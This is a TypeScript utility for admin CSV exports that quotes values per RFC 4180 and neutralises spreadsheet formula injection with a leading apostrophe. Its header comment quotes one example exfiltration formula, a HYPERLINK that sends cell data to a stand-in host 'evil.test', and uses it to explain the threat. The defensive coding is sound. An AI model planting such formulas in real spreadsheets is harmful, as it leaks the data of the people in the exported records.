/**
 * CSV generation for admin exports.
 *
 * Two separate problems, and only the first is the obvious one.
 *
 * **Quoting (RFC 4180).** Anything containing a comma, quote or newline must be
 * quoted, and embedded quotes doubled. Book titles contain commas constantly.
 *
 * **Formula injection.** A cell beginning `=`, `+`, `-`, `@`, or a tab or
 * carriage return is executed as a formula when the file is opened in Excel or
 * Sheets. `=HYPERLINK("http://evil.test?"&A1,"Click")` in a spreadsheet someone
 * at the press opens is a real attack, and every value in these exports —
 * emails, product titles, signup sources — came from outside.
 *
 * The guard is a leading apostrophe, which spreadsheets treat as "this is
 * text". It is applied *before* quoting so it ends up inside the quotes.
 */

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

export function escapeCsvValue(value: unknown): string {
  const raw = value == null ? '' : String(value);

  // Neutralise a leading formula character before any quoting decision.
  const guarded = FORMULA_PREFIX.test(raw) ? `'${raw}` : raw;

  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

/** Builds a CSV document from a header row and data rows. */
export function toCsv(header: string[], rows: unknown[][]): string {
  const lines = [
    header.map(escapeCsvValue).join(','),
    ...rows.map((row) => row.map(escapeCsvValue).join(',')),
  ];

  // CRLF, per the spec — Excel on Windows is the main consumer of these.
  return lines.join('\r\n');
}
